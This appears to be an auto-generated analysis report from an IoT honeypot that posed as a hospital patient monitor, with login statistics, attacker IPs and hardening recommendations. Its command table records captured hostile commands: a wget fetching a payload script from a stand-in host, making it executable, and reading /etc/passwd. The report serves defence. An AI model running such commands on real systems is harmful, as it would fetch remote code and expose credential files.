# Final Honeypot Analysis Report

Generated: 2026-06-13T18:35:30.085472Z

---

## Executive Summary

The IoT Honeypot Network successfully captured and analyzed attacker behavior targeting a simulated healthcare medical device. The honeypot ran as a Patient Vitals Monitor (PVM-2000X) on ports 2222 (SSH) and 2223 (Telnet) inside an isolated Docker environment.

## Key Statistics

| Metric | Value |
|---|---|
| Total events captured | 17 |
| Unique attacker IPs | 2 |
| Total sessions | 2 |
| Successful logins | 2 |
| Failed login attempts | 5 |
| Commands executed | 4 |
| Files downloaded | 0 |

## Top 10 Passwords Tried

| Password | Count |
|---|---|
| admin | 3 |
| 123456 | 2 |
| password | 2 |

## Top 10 Usernames Tried

| Username | Count |
|---|---|
| root | 6 |
| admin | 1 |

## Top 10 Commands Executed

| Command | Count |
|---|---|
| wget http://malicious.example.com/payload.sh | 1 |
| chmod +x payload.sh | 1 |
| ls /etc | 1 |
| cat /etc/passwd | 1 |

## Attacker IP Analysis

| IP Address | Country | City | ISP |
|---|---|---|---|
| 198.51.100.22 | Germany | Munich | Deutsche Telekom |
| 45.33.32.156 | United States | Ashburn | Linode LLC |

## Security Recommendations

1. Block all identified attacker IPs at the network perimeter firewall
2. Never use default credentials on any IoT device
3. Disable SSH and Telnet on medical IoT devices where not required
4. Implement network segmentation to isolate medical devices
5. Deploy honeypots as early warning systems across the hospital network
6. Monitor for lateral movement commands like cat /etc/passwd and id
7. Review all downloaded payloads for malware signatures using VirusTotal

## Conclusion

The honeypot successfully deceived attackers into believing they had compromised a real hospital medical device. All attacker activity was captured, analyzed and visualized without any risk to real systems. This intelligence can now be used to harden the actual hospital network against these attack techniques.
